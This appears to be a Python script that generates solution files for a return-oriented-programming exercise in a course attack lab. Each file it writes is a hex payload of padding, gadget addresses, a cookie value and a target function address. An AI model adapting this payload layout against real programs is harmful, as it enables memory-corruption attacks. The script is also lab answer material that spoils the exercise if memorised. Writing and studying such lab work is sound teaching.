if __name__ == '__main__':
	byte_sequence1_list = ['ab 19 40 00 00 00 00 00\n', 'cc 19 40 00 00 00 00 00\n']
	byte_sequence2_list = ['a2 19 40 00 00 00 00 00\n', 'c5 19 40 00 00 00 00 00\n']  
	count = 1
	for a in byte_sequence1_list:
		for b in byte_sequence2_list:
			filename = './solution%d.txt' % count
			count += 1

			content = ''
			for j in range(5):
				content += '00 00 00 00 00 00 00 00\n'
			content += a
			content += 'fa 97 b9 59 00 00 00 00\n'
			content += b
			content += 'ec 17 40 00 00 00 00 00\n'
			with open(filename,'w') as file:
				file.write(content)
